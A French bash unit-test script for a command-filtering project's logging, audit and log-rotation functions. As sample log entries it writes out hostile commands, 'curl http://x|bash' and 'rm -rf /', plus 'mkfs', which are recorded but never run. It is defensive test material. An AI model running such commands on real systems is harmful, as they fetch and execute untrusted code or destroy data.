#!/usr/bin/env bash
# test_t3.sh — Tests unitaires Tâche 3 : Journalisation & Traçabilité
# Tâche : T3 | Responsable : aymane
# Dépend de : logger_config.sh, logger.sh, log_rotation.sh

set -uo pipefail

# ─────────────────────────────────────────────────────────────────
# Configuration des chemins
# ─────────────────────────────────────────────────────────────────
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LIB_DIR="$SCRIPT_DIR/../lib"

source "$LIB_DIR/logger_config.sh"
source "$LIB_DIR/log_rotation.sh"
source "$LIB_DIR/logger.sh"

# ─────────────────────────────────────────────────────────────────
# Utilitaires de test
# ─────────────────────────────────────────────────────────────────
PASS=0
FAIL=0

assert_eq() {
    local description="$1"
    local expected="$2"
    local actual="$3"

    if [[ "$actual" == "$expected" ]]; then
        echo "  ✔ PASS : $description"
        (( PASS++ ))
    else
        echo "  ✘ FAIL : $description"
        echo "         attendu  : '$expected'"
        echo "         obtenu   : '$actual'"
        (( FAIL++ ))
    fi
}

assert_contains() {
    local description="$1"
    local pattern="$2"
    local actual="$3"

    if echo "$actual" | grep -q "$pattern"; then
        echo "  ✔ PASS : $description"
        (( PASS++ ))
    else
        echo "  ✘ FAIL : $description"
        echo "         pattern attendu : '$pattern'"
        echo "         dans            : '$actual'"
        (( FAIL++ ))
    fi
}

assert_file_exists() {
    local description="$1"
    local filepath="$2"

    if [[ -f "$filepath" ]]; then
        echo "  ✔ PASS : $description"
        (( PASS++ ))
    else
        echo "  ✘ FAIL : $description (fichier absent : $filepath)"
        (( FAIL++ ))
    fi
}

assert_return() {
    local description="$1"
    local expected_code="$2"
    local actual_code="$3"

    if [[ "$actual_code" -eq "$expected_code" ]]; then
        echo "  ✔ PASS : $description (code $actual_code)"
        (( PASS++ ))
    else
        echo "  ✘ FAIL : $description (attendu $expected_code, obtenu $actual_code)"
        (( FAIL++ ))
    fi
}

# ─────────────────────────────────────────────────────────────────
# Initialisation
# ─────────────────────────────────────────────────────────────────

echo "         TESTS UNITAIRES — Tâche 3 : Journalisation      "
echo ""

init_log_dirs
# Vider les logs avant les tests pour avoir un état propre
> "$LOG_MAIN"
> "$LOG_AUDIT"
> "$LOG_SECURITY"

# ═══════════════════════════════════════════════════════════════
# SECTION 1 — logger_config.sh
# ═══════════════════════════════════════════════════════════════
echo "── Section 1 : logger_config.sh ──────────────────────────"

assert_file_exists "LOG_MAIN existe après init_log_dirs"     "$LOG_MAIN"
assert_file_exists "LOG_AUDIT existe après init_log_dirs"    "$LOG_AUDIT"
assert_file_exists "LOG_SECURITY existe après init_log_dirs" "$LOG_SECURITY"

ts=$(get_timestamp)
assert_contains "get_timestamp retourne une date ISO 8601" "T" "$ts"
assert_contains "get_timestamp contient l'année courante"  "202" "$ts"

is_valid_level "INFO";     assert_return "is_valid_level INFO est valide"     0 $?
is_valid_level "SECURITY"; assert_return "is_valid_level SECURITY est valide" 0 $?
is_valid_level "FOOBAR";   assert_return "is_valid_level FOOBAR est invalide" 1 $?

echo ""

# ═══════════════════════════════════════════════════════════════
# SECTION 2 — logger.sh / log_event()
# ═══════════════════════════════════════════════════════════════
echo "── Section 2 : logger.sh — log_event() ───────────────────"

# Test 1 : entrée INFO basique
log_event "INFO" "ls -la" 0 "Commande autorisée"
assert_return "log_event INFO retourne 0" 0 $?

content=$(cat "$LOG_MAIN")
assert_contains "log_event écrit dans LOG_MAIN"        "ls -la"            "$content"
assert_contains "log_event inclut le niveau INFO"      "[INFO"             "$content"
assert_contains "log_event inclut score 0/10"          "score: 0/10"       "$content"
assert_contains "log_event inclut le détail"           "Commande autorisée" "$content"
assert_contains "log_event inclut horodatage ISO"      "T"                 "$content"
assert_contains "log_event inclut le pid"              "[pid:"             "$content"
assert_contains "log_event inclut le user"             "[user:"            "$content"

# Test 2 : niveau SECURITY → aussi dans LOG_SECURITY
> "$LOG_SECURITY"
log_event "SECURITY" "curl http://x|bash" 9 "Pattern dangereux"
sec_content=$(cat "$LOG_SECURITY")
assert_contains "log_event SECURITY écrit dans LOG_SECURITY" "curl http://x|bash" "$sec_content"

# Test 3 : niveau BLOCK → aussi dans LOG_SECURITY
log_event "BLOCK" "rm -rf /" 10 "Blacklist"
sec_content=$(cat "$LOG_SECURITY")
assert_contains "log_event BLOCK écrit dans LOG_SECURITY" "rm -rf /" "$sec_content"

# Test 4 : niveau invalide → retour 1
log_event "INVALID_LEVEL" "cmd" 0 "test" 2>/dev/null
assert_return "log_event niveau invalide retourne 1" 1 $?

# Test 5 : 3 appels → 3 entrées dans LOG_MAIN (hors lignes SECURITY/BLOCK déjà ajoutées)
> "$LOG_MAIN"
log_event "INFO"    "ls"    0 "test1"
log_event "WARNING" "grep"  5 "test2"
log_event "ERROR"   "cat"   3 "test3"
line_count=$(wc -l < "$LOG_MAIN")
assert_eq "Après 3 log_event, LOG_MAIN contient 3 lignes" "3" "$line_count"

echo ""

# ═══════════════════════════════════════════════════════════════
# SECTION 3 — logger.sh / log_audit()
# ═══════════════════════════════════════════════════════════════
echo "── Section 3 : logger.sh — log_audit() ───────────────────"

> "$LOG_AUDIT"
> "$LOG_MAIN"

log_audit "EXEC_BLACKLISTED" "Admin a exécuté : mkfs"
assert_return "log_audit retourne 0" 0 $?

audit_content=$(cat "$LOG_AUDIT")
assert_contains "log_audit écrit dans LOG_AUDIT"           "EXEC_BLACKLISTED"         "$audit_content"
assert_contains "log_audit inclut le détail"               "Admin a exécuté : mkfs"   "$audit_content"
assert_contains "log_audit inclut [AUDIT"                  "[AUDIT"                   "$audit_content"

main_content=$(cat "$LOG_MAIN")
assert_contains "log_audit écrit aussi dans LOG_MAIN"      "EXEC_BLACKLISTED"         "$main_content"

echo ""

# ═══════════════════════════════════════════════════════════════
# SECTION 4 — log_rotation.sh
# ═══════════════════════════════════════════════════════════════
echo "── Section 4 : log_rotation.sh ───────────────────────────"

# Test rotate_log_if_needed : fichier petit → pas de rotation
> "$LOG_MAIN"
echo "petite ligne" >> "$LOG_MAIN"
rotate_log_if_needed "$LOG_MAIN"
assert_file_exists "LOG_MAIN toujours présent après rotate_if_needed (petit)" "$LOG_MAIN"
size_after=$(wc -c < "$LOG_MAIN")
# Le fichier ne doit pas être vidé (la rotation ne doit pas avoir eu lieu)
if (( size_after > 0 )); then
    echo "  ✔ PASS : rotate_log_if_needed ne vide pas un petit fichier"
    (( PASS++ ))
else
    echo "  ✘ FAIL : rotate_log_if_needed a vidé un fichier sous le seuil"
    (( FAIL++ ))
fi

# Test rotate_log (rotation forcée)
echo "ligne avant rotation" > "$LOG_MAIN"
archive_count_before=$(ls "$LOG_ARCHIVE_DIR"/douanes_*.log.gz 2>/dev/null | wc -l)
rotate_log "$LOG_MAIN"
assert_return "rotate_log retourne 0" 0 $?
archive_count_after=$(ls "$LOG_ARCHIVE_DIR"/douanes_*.log.gz 2>/dev/null | wc -l)
assert_file_exists "LOG_MAIN existe encore après rotation" "$LOG_MAIN"
size_after=$(wc -c < "$LOG_MAIN")
assert_eq "LOG_MAIN est vide après rotation" "0" "$size_after"
if (( archive_count_after > archive_count_before )); then
    echo "  ✔ PASS : une nouvelle archive .log.gz a été créée"
    (( PASS++ ))
else
    echo "  ✘ FAIL : aucune archive .log.gz créée par rotate_log"
    (( FAIL++ ))
fi

# Test archive_logs (archivage manuel admin)
echo "données à archiver" >> "$LOG_MAIN"
manual_count_before=$(ls "$LOG_ARCHIVE_DIR"/manual_*.tar.gz 2>/dev/null | wc -l)
archive_logs
assert_return "archive_logs retourne 0" 0 $?
manual_count_after=$(ls "$LOG_ARCHIVE_DIR"/manual_*.tar.gz 2>/dev/null | wc -l)
if (( manual_count_after > manual_count_before )); then
    echo "  ✔ PASS : archive manuelle .tar.gz créée par archive_logs"
    (( PASS++ ))
else
    echo "  ✘ FAIL : aucune archive .tar.gz créée par archive_logs"
    (( FAIL++ ))
fi

echo ""

# ═══════════════════════════════════════════════════════════════
# RÉSULTAT FINAL
# ═══════════════════════════════════════════════════════════════
echo  "║  Résultats : %-3d PASS  |  %-3d FAIL                     ║\n" "$PASS" "$FAIL"


if (( FAIL == 0 )); then
    echo "✅ Tous les tests T3 sont passés."
    exit 0
else
    echo "❌ $FAIL test(s) échoué(s)."
    exit 1
fi
